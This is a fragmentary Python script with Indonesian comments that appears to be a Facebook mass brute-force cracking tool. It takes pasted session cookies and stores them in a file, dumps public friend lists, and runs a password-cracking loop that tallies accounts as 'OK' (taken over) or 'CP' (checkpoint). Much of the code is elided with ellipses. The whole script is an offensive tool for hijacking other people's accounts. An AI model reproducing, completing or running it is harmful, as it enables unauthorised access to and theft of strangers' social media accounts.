#!/usr/bin/python3
# -*- coding: utf-8 -*-
## JANGAN DI UBAH UBAH LAGI SCRIP NYA UDH ENAK ANJING, NANTI GUA HAPUS
...
def login_lagi334():
	try:
		banner()
		uaku()
		___pepek___ = input('[!] Masukkan Cookies : ')
		...
		cok=open(".cok.txt", "w").write(___pepek___)
		print('\nLOGIN BERHASIL  --->jalankan ulang sc ini ketik python 4mbf.py ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	banner()
	sg = '# ®® INFORMASI PENGGUNA GRATIS ®®'
	fx = mark(sg, style='green')
	sol().print(fx)
	print(x+'['+h+'•'+x+'] Selamat Datang : '+str(my_name))
...
def dump_publik():
	...
	try:
		...
		teks = '# NOT PUBLIC FRIENDSHIP OR BROKEN cookie'
...
def passwrd():
	...
	cetak(nel(krek, title=' • ⟨ FII CRACK ⟩ • '))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='FII CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='FII OK'))
					ok+=1
					break
					...
					cetak(nel(statusok1, title='[bold green]FII OK[/bold green]'))
					ok+=1
					break
